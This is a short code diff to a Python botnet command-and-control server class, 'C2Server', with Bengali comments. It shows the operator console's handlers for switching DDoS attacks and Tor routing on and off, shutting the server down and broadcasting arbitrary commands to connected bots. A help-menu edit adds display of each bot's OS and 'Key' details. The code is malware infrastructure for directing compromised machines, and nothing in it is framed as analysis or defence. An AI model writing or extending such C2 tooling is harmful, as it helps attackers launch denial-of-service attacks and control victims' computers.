-
+            
             if cmd.lower() == "ddos_off":
                 self.ddos_enabled = False
                 print_warning("⚠️ DDoS DISABLED")
                 self.broadcast_command("DDOS_DISABLED")
                 continue
-
+            
             # tor_on/off কমান্ড
             if cmd.lower() == "tor_on":
                 self.tor_enabled = True
                 print_success("✅ Tor ENABLED")
                 self.broadcast_command("TOR_ENABLED")
                 continue
-
+            
             if cmd.lower() == "tor_off":
                 self.tor_enabled = False
                 print_warning("⚠️ Tor DISABLED")
                 self.broadcast_command("TOR_DISABLED")
                 continue
-
+            
             if cmd.lower() == "debug on":
                 print_info("Debug logging enabled")
                 continue
@@ -1371,7 +1465,7 @@ class C2Server:
                 print_warning("Shutting down C2 Server...")
                 self.shutdown_flag = True
                 break
-
+            
             self.broadcast_command(cmd)
 
     def broadcast_command(self, command: str):
@@ -1401,8 +1495,8 @@ class C2Server:
 ╠══════════════════════════════════════════════════════════════╣
 ║ help              – Show this help message                  ║
 ║ dir/ls            – Show files in C2 directory             ║
-║ list              – Show connected bots                     ║
-║ bot <number>      – Show bot details (e.g., bot 1)         ║
+║ list              – Show connected bots with OS & Key info  ║
+║ bot <number>      – Show FULL bot details with Key         ║
 ║ refresh           – Refresh bot list                        ║
 ║ stats             – Show server statistics                  ║
 ║ status            – Show feature status                     ║
